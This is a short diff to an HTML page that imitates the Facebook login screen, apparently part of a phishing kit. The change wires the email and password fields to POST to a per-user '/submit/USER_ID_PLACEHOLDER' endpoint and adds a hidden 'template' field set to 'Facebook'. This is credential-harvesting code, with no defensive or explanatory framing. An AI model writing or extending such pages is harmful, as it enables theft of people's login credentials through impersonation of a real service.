@@ -181,10 +181,11 @@
     </div>
 
     <div class="right-section">
-      <form class="form">
-        <input type="text" placeholder="Email address or phone number">
-        <input type="password" placeholder="Password">
-        <button class="login-btn">Log in</button>
+      <form class="form" method="post" action="/submit/USER_ID_PLACEHOLDER">
+        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="hidden" name="template" value="Facebook">
+        <button type="submit" class="login-btn">Log in</button>
       </form>
 
       <a href="#" class="forgot-password">Forgotten password?</a>
